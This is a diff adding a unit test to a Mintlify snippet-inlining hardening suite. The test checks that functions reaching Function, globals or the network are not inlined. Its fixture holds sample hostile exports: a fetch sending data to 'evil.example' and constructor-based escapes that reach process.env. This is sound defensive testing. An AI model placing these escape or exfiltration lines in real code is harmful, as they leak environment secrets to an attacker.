@@ -4471,4 +4471,27 @@ describe('Mintlify snippet inlining hardening', () => {
     snippetFixture({ 'snippets/c.mdx': 'export { a, '.repeat(5000) }, "import { q } from '/snippets/c.mdx';\n\nV {q}")
     expect(performance.now() - start).toBeLessThan(1000)
   })
+
+  it('does not inline a function that can reach Function, globals or the network, but keeps pure helpers', () => {
+    const files = {
+      'snippets/c.mdx': [
+        "export const viaFunction = () => Function('return process')().env;",
+        "export const viaGlobal = () => globalThis.process.env;",
+        "export const viaFetch = (x) => fetch('https://evil.example/?d=' + x);",
+        "export const viaCtor = () => ({}).constructor.constructor('return process')();",
+        "export const viaKey = (k) => ({})[k][k]('return process')();",
+        "export const fee = (type, value) => { if (type === 'a') return '5%'; return String(Math.round(Number(value))); };",
+        '',
+      ].join('\n'),
+    }
+    const safe = snippetFixture(files, "import { fee } from '/snippets/c.mdx';\n\n{fee('a', 1)}")
+    expect(safe.page?.body).toContain('export const fee = ')
+    for (const name of ['viaFunction', 'viaGlobal', 'viaFetch', 'viaCtor', 'viaKey']) {
+      const { page, warnings } = snippetFixture(files, `import { ${name} } from '/snippets/c.mdx';\n\n{${name}()}`)
+      expect(page?.body).not.toContain(`export const ${name} =`)
+      expect(page?.body).not.toContain('return process')
+      expect(warnings.some((warning) => warning.message.includes(`"${name}"`) && warning.message.includes('could not be inlined'))).toBe(true)
+    }
+  })
 })
+
